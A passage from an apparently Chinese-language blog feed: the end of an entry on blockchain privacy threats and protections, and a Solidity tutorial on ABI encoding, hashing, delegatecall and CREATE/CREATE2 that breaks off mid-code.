去中心化的混币机制：整个过程由混币协议实现，不需要第三方节点的参与，能有效避免中心化混币机制出现的问题，可去中心化混币机制的计算成本要更高，服务效率也更加较为低下。而且这一种机制仍然不能说是绝对安全，比如无法保证所有参与混币的用户守信、混币用户信息易泄露、容易遭受拒绝服务攻击等等。门罗币（Monero）在混币机制中采用了环签名加密技术，虽然有效避免了上述风险，但混币过程却变得更加冗长。</p><p>智能合约漏洞也会导致用户隐私泄露。如果用户的敏感信息被不当地存储在智能合约中，一旦合约被攻击或者泄露，这些信息可能会暴露用户的身份和其他隐私数据；智能合约中的交易逻辑可能涉及用户的身份信息或其他敏感数据，一旦有人分析了智能合约的交易逻辑，就有可能通过相关信息识别用户。</p><p>   不当的方法会导致用户隐私泄露。如区块链上的数据共享特性可能导致用户的敏感数据被不当地分享给其他参与者，从而暴露用户的身份和隐私信息。如果用户在区块链上存储了未经加密的敏感信息，就容易被他人获取和解密，暴露用户的身份隐私。如果区块链平台缺乏明确的隐私保护协议，用户无法有效地保护自己的身份隐私。</p><p>为了解决上述隐私泄露问题，可采取以下措施：</p><p> （1）加密数据：在数据上链之前对敏感信息进行加密处理，确保只有授权方才能解密数据。</p><p> （2）匿名化处理：使用匿名地址进行交易，避免地址与用户身份关联。</p><p> （3）隐私保护协议：建立隐私保护协议，明确区块链上数据的使用和共享规则，保护用户隐私权益。</p><p> （4）技术改进：研发更安全的智能合约代码，及时修补漏洞，提高系统的安全性和隐私保护能力。</p><h5 id="用户交易隐私"><a href="#用户交易隐私" class="headerlink" title="用户交易隐私"></a><strong>用户交易隐私</strong></h5><p>​    在区块链数字货币起步较早的时候，数字货币仅仅是以数据链的方式从一个钱包直接转移到另一个钱包，其交易记录不做任何保护措施全部公开在区块链系统中。这样虽然有效防止了双重花费问题，但在隐私保护方面却有着极大的问题。然后又有人提出将交易数据的哈希值上链，数据本体仍然储存在链下的中心数据库。可这样一来区块链技术的防篡改、分布式特性就没有得到发挥，特别是线下数据库一旦发生存储丢失、数据损坏、单机故障等问题后还会导致系统的验证能力失效，从而引发一系列问题。    </p><p>后来又有人提出将交易数据链下加密后再上链，也就是通过对称方式加密数据，非对称加密方式加密对称密钥的方式。可这样的加密方式仍然存在一定缺陷，首先是加密过后的数据无法通过合约来进行数据的操作以及共享。然后就是加密密钥传递需要中心化机构的参与，双方的私密数据不透明，也无法通过区块链的共识来进行验证。  </p><p>​    还有一种方案是将交易数据直接进行非对称加密上链，但这种方案在很多时候也是不可行的，因为非对称加密算法主要适用于数据量较小时短数据的加密，对于交易数据这种长数据只有对称加密的性能才可以达到。但对称密钥加密数据又会存在密钥的协商问题。基于以上的问题，有人又提出了基于双重加密的交易隐私保护方法，在保证隐私数据安全性的同时，优化了加密方案，使性能得到了很好的提升。</p><p>举例：</p><p>假设用户 Alice 需要向 Bob 转账 1 个 ZEC，基于零知识证明操作过程：</p><p>（1）用户 Alice 会先将自己的这 1 个 ZEC 拆分成若干份，具体份数可以根据设置来定。</p><p>（2）大零币的公有链同时也会将其他交易输出与 Alice 的若干份 ZEC 进行混合拆分，最后从中取出合计为 1 个 ZEC 的若干份发送给 Bob 的收款地址。经过这条公有链一系列的“混币”过程，就使得包括交易地址和具体金额在内的交易信息具有很强的隐匿性。另外，从上述过程来看要实现匿名性，其所花费的计算资源就非常多，带来了大量的资源浪费，也导致了其可扩展性面临巨大挑战。</p><p>除此之外还有同态加密、零知识证明、数据隔离、属性加密等解决方案。</p><h5 id="网络隐私"><a href="#网络隐私" class="headerlink" title="网络隐私"></a><strong>网络隐私</strong></h5><p>​    网络隐私主要分为节点隐私以及通信隐私。节点隐私主要内容有服务器地理位置、节点的物理信息、系统版本、节点 IP 等。在区块链上每一个节点的安全防护能力都是不同的，再加上区块链是一个对等网络，攻击者想要获取链上被保护的数据比起中心化数据库还可能更简单一些。对公有链来说，任意节点都可以接入，攻击者也可以通过监听、扫描技术等对整个网络进行探测攻击。甚至有人通过这些方式获取了大量的比特币节点信息，然后绘制出整个比特币系统的网络拓扑，再与溯源技术结合，用户的数据隐私将受到严重威胁。</p><p>通信隐私主要内容包括数据流量、节点间数据明文及密文等。虽然如今的加密货币很多都采用了ZK-SNARK 或者是环签名等先进密码学技术，但攻击者仍可以利用旁道攻击技术，破坏交易的不可连接性、机密性、不可追溯性、匿名性等。如今，对于这类隐私威胁，常采用的解决方案有可行第三方转发、混合网络、洋葱网络、大蒜路由、雷电网络、闪电网络等。</p><p>​    洋葱网络：主要由洋葱路由组成，使攻击者获取全局信息的难度大大增加，极大地降低了通信隐私泄露威胁。特别是第二代洋葱路由的出现，进一步优化了洋葱网络，其实用性也变得更强。</p><p>​    闪电网络：这是为达到链下通道隔离机制所使用的一种技术，主要目的是解决区块链上高频小额支付不便问题。其网络运行主体在区块链链下，实现了高频小额交易的同时，还提高了用户交易隐私安全性，对整个区块链技术来说，其拓展性有一步增强。</p><p>洋葱网络是一种在计算机网络上进行匿名通信的技术。通信数据先进行多层加密然后在由若干个被称为洋葱路由器组成的通信线路上被传送。每个洋葱路由器去掉一个加密层，以此得到下一条路由信息，然后将数据继续发往下一个洋葱路由器，不断重复，直到数据到达目的地。这就防止了那些知道数据发送端以及接收端的中间人窃得数据内容。</p><p>大蒜路由（Garlic routing）是洋葱路由的一个变体，它将传输的原始数据拆散为加密数据包通过多条隧道交叉疏散传递，令攻击者的流量分析难上加难。在洋葱路由中一条或多条数据流的上传与下载共用一条隧道，而这种路由方式的上传与下载隧道相互独立而且两个方向上的隧道数量都可能&gt;1，所以被称为大蒜路由。令攻击者的流量分析难上加难。</p><p>闪电网络为解决比特币拥堵而生，当然也可以用于其他区块链项目，比如我们上篇说的OMG。不过，以太坊也有自己的“闪电网络”，它的名字叫雷电网络。甚至，以太坊除了雷电网络，还有其他类似的技术。我们可以把闪电网络、雷电网络及其他类似技术，统称为“状态通道技术”。</p><p>我们回顾下闪电网络的原理就知道，双方构建一条通道，然后双方的状态（在比特币里，仅为账户余额）在通道里刷新，通道关闭后，再将最终状态记录到区块链上。所以，状态通道这个名字还是挺贴切的。从这里可以看出，所有的状态通道技术，仅仅是把区块链当做最后的记录手段，而在平时尽量避免“上链”。</p><p>继闪电网络后，今天我们稍微来了解下以太坊的雷电网络。</p><p>在比特币那里，闪电网络只是一个单纯的技术，但以太坊的雷电网络是一个有自己代币（RDN）的ICO项目。从技术上来说，发不发代币并无区别，所以V神也曾质疑过RDN的必要性。不过从通证经济的角度来看，也许有妙用。不过，咱们这里仅了解其技术。</p><p>因为以太坊是一个图灵完备的智能合约平台，很多复杂的工作以太坊在底层就已完成了，所以雷电网络的实现其实比闪电网络更简单。雷电网络不像闪电网络，必须依赖多重签名地址予以实现，而是直接靠以太坊的智能合约来实现：</p><p>第一步：在以太坊上布署一个智能合约，理论上来说，既可以每建一个通道，就布署一个合约，也可以为一种代币布署一个合约。前者实现比较简单，但耗费gas太多，后者实现起来复杂一点，但便宜一些。</p><p>第二步：通道双方将一定量的代币发送到合约地址进行锁定，构建资金池，在闪电网络那，由多重签名地址代持代币，而在雷电网络，则由合约地址代持。同时，双方会向合约发送一条双方签名的报文，这条报文的作用是向全网公示，通道双方各自锁定了多少代币。到此时为止，通道便建立起来了。</p><p>第三步：通道建立后，双方所有的交易都可以在链下进行。举个例子：比如A和B建立了雷电通道，双方最初各自锁定了10个以太币，现在A要转1个以太币给B，那么双方一起签名一条新的信息：A减去1个以太币，B增加1个以太币（闪电通道的是记录余额，雷电通道的是记录净增减，比如A再发1个以太币给B，闪电通道会记录A还有8个，B有12个，但雷电通道会记录A减少2个，B增加2个）。这条信息不需要发到区块链上，只需A和B保留就行。</p><p>第四步：A和B之间在链下的每一次双方签名的转账信息，都有一个序列号，比如第一次是1，第二次是2，如果要结束通道（假如A发起 ），A可以将最新的，也就是序列号最大的那个信息发送到智能合约，同时提供一个锁定时间。如果在锁定时间到期前，B提供了一个更新的信息，那说明A作弊（比如，A在倒数第二条信息时收到了B的1个以太币，在最后一条信息发给B两个以太币，但A结束通道时，只提交倒数第二条信息），合约会将锁定的币全部给B，用以惩罚A，如果到期时对方没有异议，合约根据最后这条信息的净增减额计算双方的最终余额并发还给他们。</p><h5 id="应用隐私"><a href="#应用隐私" class="headerlink" title="应用隐私"></a><strong>应用隐私</strong></h5><p>​    应用隐私一般分为用户端隐私与服务端隐私，隐私主要内容有支付流敏感信息、浏览器 Cookie、密钥存放位置等。</p><p>​这一类隐私信息的泄露威胁其实并不来源于区块链技术本身，其主要问题还是在用户和服务商身上。用户的安全意识薄弱，在系统全线申请的时候往往会采用默认同意授权的方式。这样就给了第三方攻击者的操作空间，在对用户敏感信息进行收集之后，就可以通过一系列技术跟用户的身份产生映射关系，这样就能联系到用户的其他信息，造成严重的隐私泄露。而在攻击者收集信息之前，用户往往很难注意到自己暴露的哪些信息隐含着自己的敏感隐私，更不知道这些信息会被攻击者利用起来使自己的隐私信息全部暴露。</p><p>​    服务商暴露隐私的源头主要来自操作不当或者服务漏洞。就比如服务商授予用户的权限不匹配、服务商公开信息中隐含了敏感信息、插件存在漏洞等。对于这类隐私威胁，常用的解决方案有发布官方插件、身份认证、增强用户安全意识等。</p><p>为了有效保护用户端隐私和服务端隐私，可以采取以下一些措施：</p><p>   <strong>加密通信</strong>：确保用户端和服务端之间的通信是加密的，使用SSL&#x2F;TLS等协议来保护数据传输的隐私。</p><p>   <strong>隐私政策和协议</strong>：制定并明确公布隐私政策和服务协议，告知用户个人数据的收集、使用、存储、共享和保护方式，以及用户的权利和选择。</p><p>   <strong>匿名化处理</strong>：尽可能对用户端数据进行匿名化处理，避免直接暴露用户的身份信息。</p><p>数据加密：对敏感数据进行加密存储，确保只有授权人员可以解密访问。</p><p>​    <strong>访问控制</strong>：限制对用户端和服务端数据的访问权限，只允许有必要的人员能够访问和处理相关数据。</p><p>   <strong>安全审计</strong>：对系统和数据进行定期安全审计，及时发现潜在的风险和漏洞。</p><p><strong>更新维护</strong>：定期更新系统和应用程序，修复已知漏洞，以确保系统的最新安全性。</p><p>   <strong>数据备份与恢复</strong>：建立定期数据备份和灾难恢复机制，确保数据不会因故意破坏、意外删除或硬件故障而永久丢失。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础003</title>
      <link href="/2024/11/19/solidity%E5%9F%BA%E7%A1%80%EF%BC%883%EF%BC%89/"/>
      <url>/2024/11/19/solidity%E5%9F%BA%E7%A1%80%EF%BC%883%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：ABI  delegatecall create&#x2F;create2  selector try catch</p><h2 id="ABI编码解码"><a href="#ABI编码解码" class="headerlink" title="ABI编码解码"></a>ABI编码解码</h2><p>ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><strong>ABI编码：</strong></p><p><strong>1.</strong>   <strong>abi.encode</strong></p><p><strong>用于和合约交互，并将每个参数填充为32字节的数据，并拼接在一起</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line"></span><br><span class="line">  result = abi.encode(x, addr, name, array);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编码的结果为</strong></p><p><code>0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code></p><p><strong>由于abi.encode将每个数据都填充为32字节，中间会有很多0。</strong></p><p><strong>2.</strong>   <strong>abi.encodePacked</strong></p><p><strong>将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint8类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function encodePacked() public view returns(bytes memory result) &#123;</span><br><span class="line"></span><br><span class="line">  result = abi.encodePacked(x, addr, name, array);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码的结果为</p><p><code>0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006</code>，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。</p><p><strong>3.</strong>   <strong>abi.encodeWithSignature</strong></p><p><strong>与abi.encode功能类似，只不过第一个参数为函数签名，比如”foo(uint256,address,string,uint256[2])”。当调用其他合约的时候可以使用。等同于在abi.encode编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</strong></p><p><strong>4.</strong>   <strong>abi.encodeWithSelector</strong></p><p><strong>与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节</strong></p><p><strong>ABI解码：</strong></p><p><strong>abi.decode</strong></p><p>abi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;</span><br><span class="line"></span><br><span class="line">  (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ABI的使用场景"><a href="#ABI的使用场景" class="headerlink" title="ABI的使用场景"></a>ABI的使用场景</h3><p><strong>1.</strong>   <strong>在合约开发中，ABI常配合call来实现对合约的底层调用。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line"> </span><br><span class="line"> bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line"> (bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line"> require(success);</span><br><span class="line"> </span><br><span class="line"> return abi.decode(returnedData, (uint256));</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>2.</strong>   <strong>ethers.js中常用ABI实现合约的导入和函数调用。</strong></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line"> /*</span><br><span class="line">   Call the getAllWaves method from your Smart Contract</span><br><span class="line">   */</span><br><span class="line"> const waves = await wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure><p><strong>3.</strong>   <strong>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</strong></p><h3 id="Hash在solidity的应用"><a href="#Hash在solidity的应用" class="headerlink" title="Hash在solidity的应用"></a><strong>Hash在solidity的应用</strong></h3><p>一个好的哈希函数应该具有以下几个特性：</p><ul><li><p>单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。</p></li><li><p>灵敏性：输入的消息改变一点对它的哈希改变很大。</p></li><li><p>高效性：从输入的消息到哈希的运算高效。</p></li><li><p>均一性：每个哈希值被取到的概率应该基本相等。</p></li><li><p>抗碰撞性：</p></li><li><ul><li>弱抗碰撞性：给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的。</li><li>强抗碰撞性：找到任意x和x’，使得hash(x) &#x3D; hash(x’)是困难的。</li></ul></li><li><p>生成数据唯一标识</p></li><li><p>加密签名</p></li><li><p>安全加密</p></li></ul><h3 id="Solidity中常用的哈希函数："><a href="#Solidity中常用的哈希函数：" class="headerlink" title="Solidity中常用的哈希函数："></a>Solidity中常用的哈希函数：</h3><ol><li>Keccak256</li></ol><p><strong>用法：哈希 &#x3D; keccak256(数据);</strong></p><p>（Sha3和Keccak256不是同一物：Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的）</p><ol><li><p><strong>keccak256来生成一些数据的唯一标识</strong></p></li><li><p><strong>弱抗碰撞性</strong>（即给定一个消息x，找到另一个消息x’，使得hash(x) &#x3D; hash(x’)是困难的）</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 弱抗碰撞性</span><br><span class="line"></span><br><span class="line">function weak(</span><br><span class="line"></span><br><span class="line">  string memory string1</span><br><span class="line"></span><br><span class="line">  )public view returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">  return keccak256(abi.encodePacked(string1)) == _msg;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>强抗碰撞性（</strong>到任意不同的x和x’，使得hash(x) &#x3D; hash(x’)是困难的。）</li></ol> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 强抗碰撞性</span><br><span class="line"></span><br><span class="line">function strong(</span><br><span class="line"></span><br><span class="line">   string memory string1,</span><br><span class="line"></span><br><span class="line">   string memory string2</span><br><span class="line"></span><br><span class="line">  )public pure returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">  return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>是Solidity中地址类型的低级成员函数</strong></p><p><img src="https://s2.loli.net/2024/11/19/vNEoWdRnyQ3xPq4.png" alt="1.png"></p><p><img src="https://s2.loli.net/2024/11/19/QnLzdB6Mj9FPTer.png" alt="2.png"></p><p> <strong>和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额</strong></p><p><strong>注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</strong></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.delegatecall(二进制编码)</span><br></pre></td></tr></table></figure><p>ps： 二进制编码用结构化编码函数<code>abi.encodeWithSignature</code>获得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;，逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol><li><p>代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：<strong>代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行</strong>。当升级时，只需要将代理合约指向新的逻辑合约即可。</p></li><li><p>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。</p></li></ol><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p><strong>call调用&amp;dalecatecall调用</strong></p><p>ps:</p><p>函数签名为”函数名（逗号分隔的参数类型）”。例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</span><br></pre></td></tr></table></figure><p>首先：写一个被调用的合约C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//将num设定为传入的_num，并且将sender设为msg.sender</span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写：发起调用的合约B</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//合约B必须和目标合约C的变量存储布局必须相同</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，分别用<code>call</code>和<code>delegatecall</code>来调用合约<code>C</code>的<code>setVars</code>函数，更好的理解它们的区别</p><h4 id="用call调用："><a href="#用call调用：" class="headerlink" title="用call调用："></a>用call调用：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line"></span><br><span class="line">function callSetVars(address_addr, uint _num) external payable&#123;</span><br><span class="line">//两个参数_addr和_num，分别对应合约C的地址和setVars的参数</span><br><span class="line">(bool success,bytes memory data) = _addr.call(abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址</p><h4 id="用dalegatecall调用"><a href="#用dalegatecall调用" class="headerlink" title="用dalegatecall调用"></a>用dalegatecall调用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">    // delegatecall setVars()</span><br><span class="line">    (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">        abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于是delegatecall，上下文为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><span style = "color: blue;">当用户A通过合约B来delegatecall合约C时,执行了(   )          的函数，语境是 (  )        ,msg.sender和msg.value来自(   )         ,并且如果函数改变一些状态变量,产生的效果会作用于(   )            的变量上 </span></p><p>所以答案为：C,B,A,B</p><p>当<strong>用户 A 通过合约 B 使用 delegatecall 调用合约 C</strong> 时，以下情况会发生：</p><ol><li><strong>执行了 C 的函数</strong>：</li></ol><p> delegatecall 会调用目标合约（即合约 C）中的指定函数代码。</p><ol start="2"><li><strong>语境是 B</strong>：</li></ol><p> delegatecall 会在调用者合约（即合约 B）的上下文中执行代码。这意味着合约 C 的代码会在合约 B 的存储和上下文中运行，就像这段代码属于 B 一样。</p><ol start="3"><li><strong>msg.sender</strong> <strong>和 msg.value 来自 A</strong>：</li></ol><p> delegatecall 保留了原始调用者的信息。也就是说，msg.sender 和 msg.value 都来自于发起调用的用户 A。</p><ol start="4"><li><strong>状态变量的影响作用于 B 的变量上</strong>：</li></ol><p> 由于 delegatecall 在调用合约 B 的存储和上下文中执行，所以任何状态变量的修改都只会影响合约 B 中的变量，不会影响合约 C。</p><h2 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a>在合约中创建新合约</h2><p>智能合约同样也可以创建新的智能合约</p><p>去中心化交易所uniswap就是利用工厂合约（PairFactory）创建了无数个币对合约（Pair）</p><h3 id="关于工厂合约"><a href="#关于工厂合约" class="headerlink" title="关于工厂合约"></a>关于工厂合约</h3><p><code>Pair</code>合约很简单，包含3个状态变量：<strong>factory</strong>，<strong>token0</strong>和<strong>token1</strong>。</p><p>构造函数<strong>constructor</strong>在部署时将<strong>factory</strong>赋值为工厂合约地址。<strong>initialize</strong>函数会由工厂合约在部署完成后手动调用以初始化代币地址，将<strong>token0</strong>和<strong>token1</strong>更新为币对中两种代币的地址。</p><p><strong>工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。</strong></p><p><strong>PairFactory</strong>合约只有一个<strong>createPair</strong>函数，根据输入的两个代币地址<strong>tokenA</strong>和<strong>tokenB</strong>来创建新的<strong>Pair</strong>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pair pair = new Pair();</span><br></pre></td></tr></table></figure><p>就是创建合约的代码</p><p>当 PairFactory 合约调用 new Pair() 来创建一个新的 Pair 合约实例时，Pair 合约的 msg.sender 将是 PairFactory 合约本身</p><h2 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//new一个合约，并传入新合约构造函数所需的参数</span><br><span class="line"></span><br><span class="line">Contract x = new Contract&#123;value:_value&#125;(params)</span><br><span class="line"></span><br><span class="line">//其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Create2"><a href="#Create2" class="headerlink" title="Create2"></a>Create2</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>​<strong>让合约地址独立于未来的事件</strong></p><p>​不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<strong>CREATE2</strong>创建的合约地址由4个部分决定：</p><p>·      <strong>0xFF：一个常数，避免和CREATE冲突</strong></p><p><strong>·      CreatorAddress: 调用 CREATE2 的当前合约（创建合约）地址。</strong></p><p><strong>·      salt（盐）：一个创建者指定的bytes32类型的值，它的主要目的是用来影响新创建的合约的地址。</strong></p><p><strong>·      initcode: 新合约的初始字节码（合约的Creation Code和构造函数的参数）。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新地址 = hash(&quot;0xFF&quot;,创建者地址, salt, initcode)</span><br></pre></td></tr></table></figure><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a><strong>如何使用</strong></h3><p>CREATE2的用法和之前讲的CREATE类似，同样是new一个合约，并传入新合约构造函数所需的参数，<strong>只不过要多传一个salt参数</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="构建工厂合约2"><a href="#构建工厂合约2" class="headerlink" title="构建工厂合约2"></a>构建工厂合约2</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 